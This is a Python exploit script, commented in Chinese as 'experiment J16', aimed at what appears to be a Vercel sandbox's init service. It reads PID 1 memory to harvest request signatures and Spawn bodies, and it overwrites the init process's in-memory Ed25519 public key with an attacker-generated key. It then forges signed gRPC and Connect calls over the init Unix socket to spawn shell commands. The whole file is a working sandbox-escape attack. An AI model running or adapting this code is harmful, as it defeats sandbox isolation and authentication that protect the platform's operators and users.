# 实验J16: grpc 协议伪造 Spawn - 415 因 Content-Type 错误(agent 用 application/grpc+json)
# Spawn 疑似 streaming 方法(connect 协议 415) -> 必须 grpc 帧格式发送
# body 结构: 从内存 sudo.sh 残留 + /proc/1/exe 二进制字段提取
import os, re, subprocess, base64, time, socket

def run(cmd, timeout=20):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return (r.stdout + r.stderr).decode(errors='replace')
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

def read_mem_segment(start, size):
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, size, start)
        os.close(fd)
        return d
    except Exception:
        return b""

def get_maps():
    out = []
    for line in open("/proc/1/maps"):
        parts = line.split()
        if len(parts) < 2 or parts[1][0] != "r":
            continue
        a0, a1 = parts[0].split("-")
        out.append((int(a0, 16), int(a1, 16)))
    return out

OUT = open("/tmp/j16.txt", "w", buffering=1)
def log(s):
    OUT.write(s + "\n")
    print(s, flush=True)

# ---------- [1] 捕获签名对 + Spawn body 深度提取 ----------
log("== [1] 捕获 + Spawn body 提取 ==")
sig_pairs = []
spawn_ctx = []
deadline = time.time() + 30
while time.time() < deadline and not sig_pairs:
    for start, end in get_maps():
        size = min(end - start, 16 * 1024 * 1024)
        d = read_mem_segment(start, size)
        if not d:
            continue
        for m in re.finditer(rb"X-Signature: ([A-Za-z0-9+/=]{80,90})", d):
            sig = m.group(1).decode()
            tail = d[m.end():m.end()+200]
            tm = re.search(rb"X-Timestamp: (\d+)", tail)
            ts = tm.group(1).decode() if tm else "?"
            head = d[max(0, m.start()-400):m.start()]
            pm = re.search(rb"POST (/\S+) HTTP/1\.1", head)
            proc = pm.group(1).decode() if pm else "?"
            pair = (proc, ts, sig)
            if pair not in sig_pairs:
                sig_pairs.append(pair)
                log(f"  PAIR: proc={proc} ts={ts} sig={sig[:40]}...")
        # Spawn body: 在 Spawn proc 字符串 ±64KB 找 sudo.sh / command JSON
        for m in re.finditer(rb"vercel\.sandbox\.spawn\.v1\.SpawnService/Spawn", d):
            a = max(0, m.start() - 4096)
            b = min(len(d), m.start() + 65536)
            seg = d[a:b]
            for kw in [rb"sudo\.sh", rb"\"command\"", rb"\"cmd\"", rb"\"args\"", rb"\"path\""]:
                for km in re.finditer(kw, seg):
                    ctx = seg[max(0, km.start()-300):km.start()+800]
                    if ctx not in spawn_ctx and len(spawn_ctx) < 6:
                        spawn_ctx.append(ctx)
                        log(f"  CTX[{kw.decode()}] @proc_off={m.start()}+{km.start()}: {ctx!r}")
    time.sleep(0.05)
if not sig_pairs:
    log("  !! 未捕获签名对")
    OUT.close()
    print("done", flush=True)
    exit(0)

# ---------- [2] /proc/1/exe 二进制字段 ----------
log("== [2] 二进制字段提取 ==")
run("cp /proc/1/exe /tmp/init.bin 2>&1; ls -la /tmp/init.bin 2>&1")
try:
    data = open("/tmp/init.bin", "rb").read(50 * 1024 * 1024)
    strs = re.findall(rb"[\x20-\x7e]{4,}", data)
    fields = set()
    for s in strs:
        t = s.decode(errors='replace')
        if re.match(r"^(command|cmd|args|arg|env|uid|gid|name|path|workdir|dir|cwd|cap|stdin|stdout|stderr|timeout|input|output|script|shell|user|group|rootfs|mount|network|privileged|entrypoint|exec|spawn|id|secret|token|snapshot|memory|cpu|size|files|file|chroot|namespace|pid|hostname|sysbox|wsl|shared|container)$", t) and len(t) < 40:
            fields.add(t)
    log(f"  字段候选: {sorted(fields)}")
    for pat in [rb"command", rb"SpawnRequest", rb"SpawnResponse", rb"sudo\.sh"]:
        idxs = [m.start() for m in re.finditer(pat, data)][:4]
        for i in idxs:
            log(f"  {pat.decode()} @{hex(i)}: ...{data[max(0,i-80):i+160]!r}...")
except Exception as e:
    log(f"  bin ERR: {e}")

# ---------- [3] pubkey + 验证 + 替换 ----------
cmdline = run("cat /proc/1/cmdline | tr '\\0' ' '")
m = re.search(r"--pubkey=([A-Za-z0-9+/=]+)", cmdline)
pub_raw = base64.b64decode(m.group(1))
log(f"[3] pubkey: {m.group(1)}")
spki = bytes.fromhex("302a300506032b6570032100") + pub_raw
open("/tmp/pub.spki", "wb").write(spki)
run("openssl pkey -pubin -inform DER -in /tmp/pub.spki -out /tmp/pub.pem 2>&1")

def verify(msg: bytes, sig_b64: str) -> bool:
    open("/tmp/msg.bin", "wb").write(msg)
    open("/tmp/sig.bin", "wb").write(base64.b64decode(sig_b64))
    out = run("openssl pkeyutl -verify -pubin -inkey /tmp/pub.pem -rawin -in /tmp/msg.bin -sigfile /tmp/sig.bin 2>&1")
    return "Signature Verified Successfully" in out

fmt_ok = False
for proc, ts, sig in sig_pairs:
    if verify(proc.encode() + ts.encode(), sig):
        log(f"  proc+ts 确认: {proc} ts={ts}")
        fmt_ok = True
        break
if not fmt_ok:
    log("  !! 验证失败")
    OUT.close()
    print("done", flush=True)
    exit(0)

copies = []
for line in open("/proc/1/maps"):
    parts = line.split()
    if len(parts) < 2 or parts[1][0] != "r":
        continue
    a0, a1 = parts[0].split("-")
    start, end = int(a0, 16), int(a1, 16)
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, min(end - start, 16 * 1024 * 1024), start)
        os.close(fd)
    except Exception:
        continue
    idx = 0
    while True:
        i = d.find(pub_raw, idx)
        if i < 0:
            break
        copies.append(start + i)
        idx = i + 1
log(f"  pubkey 副本: {[hex(c) for c in copies]}")

run("openssl genpkey -algorithm ED25519 -out /tmp/atk_priv.pem 2>&1")
run("openssl pkey -in /tmp/atk_priv.pem -pubout -outform DER -out /tmp/atk_pub.der 2>&1")
atk_pub = open("/tmp/atk_pub.der", "rb").read()[-32:]
fd = os.open("/proc/1/mem", os.O_RDWR)
backups = []
for off in copies:
    backups.append((off, os.pread(fd, 32, off)))
    os.pwrite(fd, atk_pub, off)
log(f"  已替换 {len(copies)} 处")

def sign(msg: bytes) -> bytes:
    open("/tmp/msg.bin", "wb").write(msg)
    run("openssl pkeyutl -sign -inkey /tmp/atk_priv.pem -rawin -in /tmp/msg.bin -out /tmp/sig.bin 2>&1")
    return open("/tmp/sig.bin", "rb").read()

def http_unix_raw(path, body, ctype, timeout=8):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect("/run/vercel/share/init.sock")
        ts = str(int(time.time()))
        req = (f"POST {path} HTTP/1.1\r\nHost: localhost\r\n"
               f"Content-Type: {ctype}\r\nContent-Length: {len(body)}\r\n"
               f"X-Signature: {base64.b64encode(sign(path.encode() + ts.encode())).decode()}\r\n"
               f"X-Timestamp: {ts}\r\n\r\n").encode() + body
        s.sendall(req)
        data = b""
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                data += c
        except socket.timeout:
            pass
        s.close()
        head, _, respbody = data.partition(b"\r\n\r\n")
        status = head.split(b" ")[1].decode() if b" " in head else "?"
        return status, head[:400], respbody[:800]
    except Exception as e:
        return "ERR", str(e).encode(), b""

def grpc_frame(json_body: bytes) -> bytes:
    return b"\x00" + len(json_body).to_bytes(4, "big") + json_body

# ---------- [4] Spawn 调用矩阵 ----------
log("== [4] Spawn 调用矩阵(grpc 协议) ==")
SPAWN = "/vercel.sandbox.spawn.v1.SpawnService/Spawn"
TEST = "id; uname -a; cat /proc/1/status | head -10"
json_bodies = [
    b"{}",
    b'{"command":{"path":"/bin/sh","args":["-c","' + TEST.encode() + b'"]}}',
    b'{"command":{"path":"/bin/sh","args":["-c","' + TEST.encode() + b'"],"env":{}}}',
    b'{"cmd":{"path":"/bin/sh","args":["-c","' + TEST.encode() + b'"]}}',
    b'{"command":"/bin/sh","args":["-c","' + TEST.encode() + b'"]}',
    b'{"exec":{"path":"/bin/sh","args":["-c","' + TEST.encode() + b'"]}}',
]
for i, jb in enumerate(json_bodies):
    st, hh, rb = http_unix_raw(SPAWN, grpc_frame(jb), "application/grpc+json")
    log(f"  grpc+json body[{i}] {jb[:70]!r}")
    log(f"    -> {st}")
    log(f"    head: {hh!r}")
    log(f"    body: {rb!r}")
    if st == "200":
        log("  ########## Spawn grpc 调用成功! ##########")
        break
    # 也试 connect+json(万一 Spawn 是 unary)
    st2, hh2, rb2 = http_unix_raw(SPAWN, jb, "application/connect+json")
    log(f"  connect+json body[{i}] -> {st2} | head: {hh2!r} | body: {rb2!r}")
    if st2 == "200":
        log("  ########## Spawn connect 调用成功! ##########")
        break

# ---------- [5] 恢复 ----------
log("[5] 恢复 pubkey")
for off, orig in backups:
    os.pwrite(fd, orig, off)
os.close(fd)
log("done")
OUT.close()
